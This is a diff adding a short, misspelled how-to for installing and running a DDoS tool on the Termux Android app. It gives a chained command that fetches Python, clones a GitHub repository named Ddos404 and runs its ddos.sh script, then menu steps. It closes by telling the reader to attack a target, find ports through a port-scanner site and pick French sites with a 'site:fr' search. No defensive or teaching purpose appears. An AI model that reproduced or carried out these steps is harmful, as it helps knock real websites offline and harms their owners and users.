@@ -1,0 +1,12 @@
+Insall Termux App
+
+ddos Attack Installation
+01. apt update && apt upgrade -y && pkg install python && pkg install python2 && pkg install git && git clone https://github.com/CyberMrlink/Ddos404 && ls && cd Ddos404 && ls && chmod +x * && ls && ./ddos.sh
+
+02. ddos RunTools Command : ls && cd Ddos404 && ls && chmod +x * && ls && ./ddos.sh 
+
+03. 1 Enter
+
+04. 1 Enter
+
+Attack On terget [ For port: go to webportscanner.com  for france site  site:fr ]
